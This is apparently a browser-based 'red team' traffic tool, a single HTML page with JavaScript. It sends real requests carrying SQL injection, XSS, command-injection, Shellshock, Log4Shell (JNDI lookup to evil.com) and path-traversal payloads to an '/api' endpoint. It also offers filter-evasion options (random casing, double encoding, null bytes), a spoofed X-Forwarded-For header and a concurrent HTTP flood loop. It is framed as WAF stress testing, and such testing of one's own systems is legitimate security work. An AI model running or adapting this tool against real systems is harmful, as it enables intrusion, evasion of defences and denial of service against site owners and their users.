<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS | Red Team Traffic Emulator</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg: #050505; --panel: #0a0a0a; --border: #222;
            --primary: #00ff9d; --accent: #00b8ff; --danger: #ff003c; --warn: #ffcc00;
            --font-mono: 'JetBrains Mono', 'Fira Code', monospace;
        }
        * { box-sizing: border-box; user-select: none; }
        body { background: var(--bg); color: #ccc; font-family: var(--font-mono); margin: 0; height: 100vh; overflow: hidden; display: grid; grid-template-columns: 300px 1fr; }

        /* SIDEBAR */
        .sidebar { background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 10px; }
        .brand { font-size: 1.4rem; color: var(--primary); font-weight: 900; letter-spacing: 2px; margin-bottom: 20px; text-align: center; text-shadow: 0 0 10px rgba(0,255,157,0.3); }
        
        .control-group { margin-bottom: 20px; border: 1px solid var(--border); padding: 10px; border-radius: 4px; background: #000; }
        .label { font-size: 0.7rem; color: #666; text-transform: uppercase; margin-bottom: 8px; display: block; font-weight: bold; }
        
        .btn { 
            width: 100%; background: #111; border: 1px solid #333; color: var(--primary); 
            padding: 12px; font-family: var(--font-mono); cursor: pointer; transition: 0.1s; 
            text-align: left; font-size: 0.8rem; margin-bottom: 5px; display: flex; justify-content: space-between;
        }
        .btn:hover { background: #1a1a1a; border-color: var(--primary); }
        .btn:active { transform: translateY(2px); }
        .btn-danger { color: var(--danger); border-color: #330000; }
        .btn-danger:hover { background: #220000; border-color: var(--danger); }
        
        .slider-container { display: flex; align-items: center; gap: 10px; font-size: 0.8rem; }
        input[type=range] { flex: 1; accent-color: var(--primary); }

        /* MAIN DASHBOARD */
        .main { display: grid; grid-template-rows: 60px 1fr 200px; height: 100vh; }
        
        /* Header Stats */
        .header { border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 20px; background: rgba(0,0,0,0.5); backdrop-filter: blur(5px); }
        .stat-box { text-align: center; }
        .stat-val { font-size: 1.2rem; font-weight: bold; color: #fff; display: block; }
        .stat-lbl { font-size: 0.65rem; color: #666; text-transform: uppercase; }
        .text-danger { color: var(--danger) !important; }
        
        /* Live Terminal */
        .terminal { background: #000; padding: 15px; overflow-y: auto; font-size: 0.75rem; display: flex; flex-direction: column-reverse; position: relative; }
        .terminal::before { content: "LIVE TRAFFIC STREAM"; position: absolute; top: 10px; right: 20px; color: #222; font-weight: 900; font-size: 3rem; pointer-events: none; z-index: 0; }
        .log { position: relative; z-index: 1; margin-bottom: 2px; border-bottom: 1px solid #0a0a0a; padding: 3px 0; display: grid; grid-template-columns: 60px 50px 50px 1fr; gap: 10px; animation: fadein 0.1s; }
        .l-time { color: #444; }
        .l-method { font-weight: bold; }
        .l-status { font-weight: bold; }
        .s-200 { color: var(--primary); } .s-403 { color: var(--danger); } .s-429 { color: var(--warn); } .s-0 { color: #444; }
        .l-payload { color: #aaa; word-break: break-all; }
        .tag { display: inline-block; padding: 0 4px; border-radius: 2px; font-size: 0.65rem; border: 1px solid #333; margin-right: 5px; }

        /* Analytics Pane */
        .analytics { border-top: 1px solid var(--border); background: var(--panel); padding: 15px; display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; }
        .graph-box { border: 1px solid var(--border); background: #000; position: relative; }
        .graph-bar { background: var(--danger); height: 100%; width: 0%; transition: width 0.2s; opacity: 0.2; }
        
        @keyframes fadein { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }

        /* Glitch Effect */
        .glitch { animation: glitch 1s linear infinite; }
        @keyframes glitch { 2%, 64% { transform: translate(2px,0) skew(0deg); } 4%, 60% { transform: translate(-2px,0) skew(0deg); } 62% { transform: translate(0,0) skew(5deg); } }
    </style>
</head>
<body>

<div class="sidebar">
    <div class="brand">NEXUS <span style="font-size:0.5em; vertical-align:middle; color:#666;">v3.0</span></div>
    
    <div class="control-group">
        <span class="label">Attack Vectors (WAF Stress)</span>
        <button class="btn" onclick="engine.startBatch('SQLi')">
            <span>SQL INJECTION</span> <i class="fa-solid fa-database"></i>
        </button>
        <button class="btn" onclick="engine.startBatch('XSS')">
            <span>XSS POLYGLOT</span> <i class="fa-solid fa-code"></i>
        </button>
        <button class="btn" onclick="engine.startBatch('RCE')">
            <span>RCE / SHELLSHOCK</span> <i class="fa-solid fa-terminal"></i>
        </button>
        <button class="btn" onclick="engine.startBatch('LFI')">
            <span>PATH TRAVERSAL</span> <i class="fa-solid fa-folder-open"></i>
        </button>
    </div>

    <div class="control-group">
        <span class="label">Volumetric (Rate Limit)</span>
        <div class="slider-container">
            <span>Concurrency:</span>
            <input type="range" id="concurrency" min="1" max="20" value="5" oninput="document.getElementById('c-val').innerText=this.value">
            <span id="c-val" style="color:var(--primary)">5</span>
        </div>
        <button class="btn btn-danger" id="btn-flood" onclick="engine.toggleFlood()">
            <span id="flood-txt">START HTTP FLOOD</span> <i class="fa-solid fa-bolt"></i>
        </button>
    </div>

    <div class="control-group">
        <span class="label">Evasion Techniques</span>
        <div style="font-size:0.7rem; color:#888; margin-bottom:10px;">
            <input type="checkbox" id="opt-poly" checked> Polymorphism (Case/Char)<br>
            <input type="checkbox" id="opt-encode"> Double URL Encode<br>
            <input type="checkbox" id="opt-null"> Null Byte Injection
        </div>
    </div>
</div>

<div class="main">
    <div class="header">
        <div class="stat-box">
            <span class="stat-lbl">TARGET HOST</span>
            <span class="stat-val" style="font-size:1rem; color:var(--accent)" id="target-host">...</span>
        </div>
        <div class="stat-box">
            <span class="stat-lbl">TOTAL REQUESTS</span>
            <span class="stat-val" id="stat-total">0</span>
        </div>
        <div class="stat-box">
            <span class="stat-lbl">WAF BLOCKS (403)</span>
            <span class="stat-val text-danger" id="stat-blocked">0</span>
        </div>
        <div class="stat-box">
            <span class="stat-lbl">THROUGHPUT (RPS)</span>
            <span class="stat-val" id="stat-rps">0</span>
        </div>
    </div>

    <div class="terminal" id="terminal">
        </div>

    <div class="analytics">
        <div style="color:#666; font-size:0.7rem;">
            <strong>STATUS:</strong> <span id="engine-status" style="color:var(--primary)">IDLE</span><br>
            <strong>LAST VECTOR:</strong> <span id="last-vector">-</span><br>
            <strong>LATENCY:</strong> <span id="last-latency">0ms</span>
        </div>
        <div class="graph-box" title="Block Rate">
            <div id="bar-block-rate" class="graph-bar"></div>
            <span style="position:absolute; top:5px; left:5px; font-size:0.6rem; color:#fff;">BLOCK RATE</span>
        </div>
        <div style="color:#666; font-size:0.7rem;">
            <i class="fa-solid fa-circle-info"></i> This tool generates <strong>real</strong> HTTP traffic using Fetch API.<br>
            <i class="fa-solid fa-triangle-exclamation"></i> Requests originate from <strong>Client IP</strong>.
        </div>
    </div>
</div>

<script>
/**
 * NEXUS ENGINE - Advanced Client-Side Traffic Generator
 * Capabilities: Concurrency, Polymorphism, Evasion, Real-time Metrics
 */

const TARGET_BASE = window.location.origin + "/api"; // Hedef Endpoint (Netlify Functions veya Mock)
document.getElementById('target-host').innerText = window.location.hostname;

// --- 1. PAYLOAD DATABASE (WAF KILLERS) ---
const PAYLOADS = {
    'SQLi': [
        "' OR '1'='1", 
        "1 UNION SELECT null,@@version,null --", 
        "admin' --", 
        "1; DROP TABLE users", 
        "' OR 1=1 /*", 
        "1' OR '1'='1' -- "
    ],
    'XSS': [
        "<script>alert(document.domain)</script>", 
        "<img src=x onerror=alert(1)>", 
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "<svg/onload=alert(1)>"
    ],
    'RCE': [
        "; cat /etc/passwd", 
        "| whoami", 
        "() { :;}; /bin/bash -c 'sleep 5'", 
        "${jndi:ldap://evil.com/x}"
    ],
    'LFI': [
        "../../../../etc/passwd", 
        "..%2F..%2F..%2Fwindows%2Fwin.ini", 
        "/var/log/apache/access.log"
    ]
};

// --- 2. ENGINE CORE ---
const engine = {
    stats: { total: 0, blocked: 0, startTime: 0 },
    isFlooding: false,
    rpsInterval: null,

    // Yardımcı: Rastgele büyük/küçük harf (WAF Regex Bypass için)
    polymorph: (str) => {
        if(!document.getElementById('opt-poly').checked) return str;
        return str.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
    },

    // Yardımcı: Evasion Encoding
    encode: (str) => {
        let res = str;
        if(document.getElementById('opt-encode').checked) res = encodeURIComponent(encodeURIComponent(res));
        if(document.getElementById('opt-null').checked) res = res + '%00';
        return res;
    },

    // Tekil Saldırı İsteği
    async sendReq(vector, payload) {
        const finalPayload = this.encode(this.polymorph(payload));
        const start = performance.now();
        
        // Hedef URL'yi kirletme (Query Based Attack)
        const url = `${TARGET_BASE}/${vector.toLowerCase()}?q=${finalPayload}&t=${Date.now()}`;
        
        this.stats.total++;
        this.updateUI();

        try {
            const res = await fetch(url, { 
                method: 'GET', // Bazı WAF'lar GET'te Query String'i daha sert tarar
                cache: 'no-store',
                headers: {
                    'X-Forwarded-For': '127.0.0.1', // Header Poisoning
                    'User-Agent': 'Nexus/3.0 Security Scanner'
                }
            });
            
            const duration = Math.round(performance.now() - start);
            const isBlocked = res.status === 403 || res.status === 406 || res.status === 500;
            
            if(isBlocked) this.stats.blocked++;
            
            this.log(vector, res.status, finalPayload, duration);
            document.getElementById('last-latency').innerText = duration + 'ms';

        } catch(e) {
            // Network Error (WAF Connection Reset/Drop)
            this.stats.blocked++;
            this.log(vector, 0, finalPayload, 0);
        }
    },

    // Batch (Parti) Gönderici - Concurrency Ayarına Göre
    async startBatch(vector) {
        const payloads = PAYLOADS[vector];
        if(!payloads) return;
        
        document.getElementById('engine-status').innerText = `ATTACKING: ${vector}`;
        document.getElementById('last-vector').innerText = vector;

        const concurrency = parseInt(document.getElementById('concurrency').value);
        const promises = [];

        // Her payload için Concurrency kadar istek oluştur
        payloads.forEach(p => {
            for(let i=0; i<concurrency; i++) {
                promises.push(this.sendReq(vector, p));
            }
        });

        await Promise.allSettled(promises);
        document.getElementById('engine-status').innerText = "IDLE";
    },

    // Flood Loop
    toggleFlood() {
        const btn = document.getElementById('flood-txt');
        if(this.isFlooding) {
            this.isFlooding = false;
            btn.innerText = "START HTTP FLOOD";
            document.getElementById('engine-status').innerText = "IDLE";
        } else {
            this.isFlooding = true;
            btn.innerText = "STOPPING..."; // Geçiş efekti
            setTimeout(() => btn.innerText = "FLOOD ACTIVE", 200);
            document.getElementById('engine-status').innerText = "FLOODING";
            this.floodLoop();
        }
    },

    async floodLoop() {
        const concurrency = parseInt(document.getElementById('concurrency').value);
        while(this.isFlooding) {
            const batch = [];
            for(let i=0; i<concurrency; i++) {
                // Rastgele bir vektör ve payload seç
                const vecKeys = Object.keys(PAYLOADS);
                const vec = vecKeys[Math.floor(Math.random() * vecKeys.length)];
                const p = PAYLOADS[vec][Math.floor(Math.random() * PAYLOADS[vec].length)];
                batch.push(this.sendReq(vec, p));
            }
            await Promise.allSettled(batch);
            await new Promise(r => setTimeout(r, 50)); // Browser'ın kilitlenmemesi için mikro mola
        }
    },

    // UI Güncellemeleri
    log(method, status, payload, ms) {
        const term = document.getElementById('terminal');
        const row = document.createElement('div');
        row.className = 'log';
        
        let sClass = 's-200';
        if(status === 403) sClass = 's-403'; // Blocked
        if(status === 429) sClass = 's-429'; // Rate Limit
        if(status === 0) sClass = 's-0';     // Dropped

        const displayPayload = payload.length > 40 ? payload.substring(0,40)+'...' : payload;
        
        row.innerHTML = `
            <span class="l-time">${new Date().toLocaleTimeString().split(' ')[0]}</span>
            <span class="l-method">GET</span>
            <span class="l-status ${sClass}">${status === 0 ? 'DROP' : status}</span>
            <div class="l-payload">
                <span class="tag">${method}</span>${displayPayload}
            </div>
        `;
        
        // Terminal 100 satırda kalsın
        if(term.children.length > 100) term.lastElementChild.remove();
        term.prepend(row);
    },

    updateUI() {
        document.getElementById('stat-total').innerText = this.stats.total;
        document.getElementById('stat-blocked').innerText = this.stats.blocked;
        
        // Block Rate Bar
        const rate = this.stats.total > 0 ? (this.stats.blocked / this.stats.total) * 100 : 0;
        document.getElementById('bar-block-rate').style.width = rate + '%';
    }
};

// RPS Hesaplayıcı
setInterval(() => {
    if(engine.stats.startTime === 0) engine.stats.startTime = Date.now();
    const diff = (Date.now() - engine.stats.startTime) / 1000;
    if(diff > 1) {
        const rps = Math.round(engine.stats.total / diff);
        document.getElementById('stat-rps').innerText = rps;
        // Reset per 10 sec to keep RPS current
        if(diff > 10) { engine.stats.total = 0; engine.stats.blocked = 0; engine.stats.startTime = Date.now(); }
    }
}, 1000);

</script>
</body>
</html>
